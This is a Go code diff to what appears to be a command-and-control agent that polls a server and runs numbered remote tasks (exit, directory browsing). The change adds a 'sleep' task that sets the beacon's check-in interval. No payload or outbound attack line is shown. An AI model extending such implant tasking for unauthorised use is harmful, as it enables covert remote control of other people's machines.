@@ -22,6 +22,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"time"
 
 )
@@ -120,11 +121,6 @@ func checkInLoop() {
 			continue
 		}
 
-		if checkinData.NewSleep > 0 {
-			sleepInterval = time.Duration(checkinData.NewSleep) * time.Second
-			log.Printf("Updated check-in interval to %s", sleepInterval)
-		}
-
 		if len(checkinData.Tasks) == 0 {
 			log.Println("No tasks received.")
 			continue
@@ -152,6 +148,45 @@ func processTasks(tasks []*Task) {
 		case 4: // Exit
 			log.Println("Received exit command. Terminating.")
 			os.Exit(0)
+		case 5: // Sleep
+			var newSleep int32
+			// 调试：打印原始参数
+			log.Printf("Sleep task received. TaskID: %s, Arguments length: %d, Arguments raw: %q", task.TaskID, len(task.Arguments), string(task.Arguments))
+
+			if len(task.Arguments) == 0 {
+				execErr = fmt.Errorf("empty sleep arguments")
+			} else {
+				// 尝试解析为JSON数字或字符串
+				var sleepValue interface{}
+				if err := json.Unmarshal(task.Arguments, &sleepValue); err != nil {
+					execErr = fmt.Errorf("invalid JSON: %v", err)
+				} else {
+					// 处理数字或字符串格式
+					switch v := sleepValue.(type) {
+					case float64: // JSON数字: 30
+						newSleep = int32(v)
+					case string: // JSON字符串: "30"
+						if parsed, err := parseInt32(v); err != nil {
+							execErr = fmt.Errorf("invalid sleep value: %s", v)
+						} else {
+							newSleep = parsed
+						}
+					default:
+						execErr = fmt.Errorf("unsupported sleep argument type: %T", v)
+					}
+
+					// 验证范围
+					if execErr == nil {
+						if newSleep < 1 || newSleep > 3600 {
+							execErr = fmt.Errorf("sleep value must be between 1 and 3600 seconds, got %d", newSleep)
+						} else {
+							sleepInterval = time.Duration(newSleep) * time.Second
+							log.Printf("Updated check-in interval to %s", sleepInterval)
+							output = []byte(fmt.Sprintf("Sleep interval set to %d seconds", newSleep))
+						}
+					}
+				}
+			}
 		case 6: // Browse
 			output, execErr = handleBrowseTask(task.Arguments)
 		default:
@@ -446,4 +481,14 @@ func handleBrowseTask(args []byte) ([]byte, error) {
 	}
 
 	return []byte(absoluteDirPath + "\n" + string(jsonOutput)), nil
+}
+
+// parseInt32 解析字符串为int32
+func parseInt32(s string) (int32, error) {
+	var result int64
+	var err error
+	if result, err = strconv.ParseInt(s, 10, 32); err != nil {
+		return 0, err
+	}
+	return int32(result), nil
 }
